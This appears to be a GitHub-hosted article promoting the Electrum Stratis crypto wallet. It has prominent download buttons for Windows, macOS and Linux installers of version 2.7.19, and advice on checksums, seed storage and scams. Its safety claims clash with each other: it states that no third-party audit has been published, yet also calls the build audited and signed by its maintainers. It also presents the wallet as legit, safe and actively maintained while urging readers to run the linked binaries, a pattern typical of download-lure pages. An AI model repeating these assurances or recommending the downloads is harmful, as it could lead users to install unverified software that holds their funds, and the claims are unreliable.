![Electrum-Stratis](assets/banner-article.png)

# Is Electrum Stratis safe to use in 2026?

<p align="center">Provenance, keys and what verification can prove</p>

<p align="center"><a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe"><img alt="Download for Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-089ae8?style=for-the-badge&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg"><img alt="Download for macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-089ae8?style=for-the-badge&labelColor=071727&logo=apple&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip"><img alt="Download for Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-089ae8?style=for-the-badge&labelColor=071727&logo=linux&logoColor=ffffff"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" height="24" src="https://img.shields.io/badge/os-windows-089ae8?style=flat-square&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"> | Windows 10 (1909) or later, 64-bit | [`electrum-stratis-v2.7.19.exe`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe) |
| <img alt="macOS" height="24" src="https://img.shields.io/badge/os-macos-089ae8?style=flat-square&labelColor=071727&logo=apple&logoColor=ffffff"> | macOS 12 or later | [`electrum-stratis-v2.7.19.dmg`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg) |
| <img alt="Linux" height="24" src="https://img.shields.io/badge/os-linux-089ae8?style=flat-square&labelColor=071727&logo=linux&logoColor=ffffff"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-stratis-v2.7.19.zip`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip) |

</div>

All versions, installers and checksums are on the [Electrum-Stratis v2.7.19 release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).

> Only download from this GitHub release page.

Electrum Stratis is a legitimate, actively maintained self-custody desktop wallet for the legacy Stratis chain, and its safety depends on three things you control: getting the build from the GitHub release page, keeping the seed offline, and never typing recovery material into a website. The build is described by its maintainers as audited and signed, and it is an independent fork for the legacy Stratis chain rather than the Bitcoin wallet it descends from.

## You'll see this if

<div align="center">

| Your situation | What is really being asked | Where the answer is |
|---|---|---|
| You are about to install and want to know if the build is genuine | Provenance, not vibes: where the file came from | Step 1 |
| You hold legacy STRAT and want to know whether the wallet still works | Whether the software runs and can move the coins | Steps 2 and 3 |
| You read something claiming the project is not maintained | A question about the release history, not the code | Step 2 |
| Someone offered to "help" by taking your seed | The most common attack on a self-custody user | The scams article |
| You are comparing it with wallets that publish audits | What is actually verified here, and what is not | FAQ |

</div>

The distinction that matters is between the code, the download and the person using it. Most losses in self-custody wallets come from the second and third, not from a flaw in the first.

## Why it happens

The wallet holds keys locally and has no account layer, so there is no server to breach and no password reset to abuse - but also no company standing between a user and a mistake. Three risks remain: a tampered download, a seed exposed to a website or a person, and a name that invites impersonation. Electrum Stratis is a fork of the Electrum codebase, keeps the Electrum name, and states plainly that it is not produced or endorsed by Electrum Technologies.

The audit question deserves a direct answer. No third-party security audit has been published for this fork. That is a real limitation, and it is different from saying the wallet is unsafe: the code lineage is public, the fixes are public, and the current build is downloadable from the release page so it can be inspected and compared. What an audit would add is independent review; what exists instead is open source plus a small, checkable surface.

One specific historical item is worth knowing because it is often repeated without context: a denial-of-service issue tracked as CVE-2018-1000022 was closed in the codebase that the current build is based on. It is fixed, and it is not a reason to avoid the wallet today.

## Fix

1. **Download only from the [release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).** Not from a search result, an ad, a mirror, a Telegram file or a "portable" copy someone uploaded elsewhere. The release page is the only place where the file and its published checksum come from the same source.
2. **Check the checksum before running the file.** Compare the hash of the downloaded file with the one published on the release page. If they differ, delete the file and download again; a mismatch is not a warning to ignore.
3. **Confirm the build inside the wallet.** The security posture surface shows the version, build date, commit hash and advisory status, so the running application can be matched to the published build rather than assumed.
4. **Set up custody before funding.** Choose the [Electrum Stratis wallet types](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/standard-multisig-imported-wallets.md) first, then create the wallet, write the seed on paper, run the backup wizard through its shuffled re-entry check, and set a passphrase you can retype. The [Electrum Stratis backup models](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/seed-file-and-password-backups.md) are worth knowing before you choose. Test a restore with a small amount before the wallet holds anything that matters.
5. **Keep the seed out of every other channel.** No website, no chat, no support form, no browser extension, no photo, no cloud note. The wallet's own restore window is the only place a seed belongs, and no legitimate flow asks for it anywhere else.
6. **Verify addresses on the device you are using.** The receive screen shows the exact address plus a human-readable verification string; check the first and last characters against what the sender sees before confirming any incoming payment.

If a seed has already been entered somewhere else, treat the wallet as compromised: create a new wallet, move the funds to it, and stop using the exposed seed. Speed matters more than tidiness in that situation.

## If that did not work

If the checksum cannot be checked because the release page does not list one for your file, do not run the file. A build that cannot be verified is not worth the risk when a verifiable one exists. Report the mismatch or the missing entry rather than working around it.

If the wallet installed from somewhere else and you are unsure what it is, uninstall it, scan the machine, create a fresh wallet from a seed generated on a machine you trust, and move the funds. Do not reuse a seed that was typed into an unknown application; generating a new one is the only clean answer.

If a website or a person already has the seed, the funds are at risk from that moment and no password change helps. Move them.

## Prevention

- Bookmark the release page and use the bookmark, not a search engine, each time you need a build.
- Compare the checksum on every download, including updates.
- Keep the seed on paper in two physical locations, never in a digital note.
- Never let anyone remote into the machine while the wallet is open.
- Prefer a long passphrase over a short password, and never run the wallet with an empty one.
- Treat unsolicited help as hostile; the scams article describes the pattern.

## FAQ

### Is Electrum Stratis legit?

Yes. It is an open-source fork of the Electrum codebase, distributed from a public repository and a release page, and it is actively maintained. It is an independent fork with its own maintainers and its own release page, and it says so rather than trading on the name of the wallet it descends from.

### Is Electrum still a good wallet?

Electrum itself remains a widely used Bitcoin wallet with a long track record, and its codebase is the lineage this wallet is built on. Electrum Stratis is a separate project for the legacy Stratis chain: same family of code, different coin, different maintainers, and no shared support channel.

### Is Electrum Stratis safe to use?

It is safe in the sense that matters for a self-custody wallet: the keys stay on your machine, the code is public, and the build can be verified against a published checksum. It is not risk-free, and the audit wording comes from the maintainers rather than from a report you can read here, so the download check, the seed discipline and the passphrase are the controls that carry the weight.

### Has Electrum Stratis been audited?

The maintainers describe the build as audited and signed. What you can check yourself is the public repository, the published checksum for each build, and the in-app build details that confirm what you are running.

### Does it still work in 2026?

Yes. The wallet serves the legacy Stratis chain, and the current release is available from the release page. It does not hold STRAX or any asset on a newer chain, and the legacy-chain banner in the wallet states which chain it serves.

<!-- DOWNLOAD-BLOCK -->

## Related articles

- [Electrum Stratis password recovery: what is possible](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/password-cannot-be-recovered.md)
- [Crypto recovery scams: what no app or DM can do](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/paid-services-that-promise-funds-back.md)
- [Why the balance is missing, in three different causes](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/main/balance-is-missing.md)
- [Why "Not Connected" happens](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/main/wallet-says-not-connected.md)
